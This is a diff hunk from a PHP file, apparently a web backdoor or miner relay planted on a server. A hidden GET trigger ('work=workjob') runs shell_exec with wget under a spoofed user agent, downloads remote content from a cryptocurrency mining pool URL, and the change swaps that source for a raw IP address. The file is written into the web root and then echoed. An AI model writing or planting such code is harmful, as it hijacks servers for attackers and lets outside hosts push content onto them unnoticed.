@@ -9,7 +9,7 @@ if($_GET["work"] == "workjob")
   
 {
 
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://mine.arionumpool.com/mine.php?q=info;cat /var/www/html/linux84");
+echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://154.127.52.52:8884/?work=workjob;cat /var/www/html/linux84");
 
 }
 
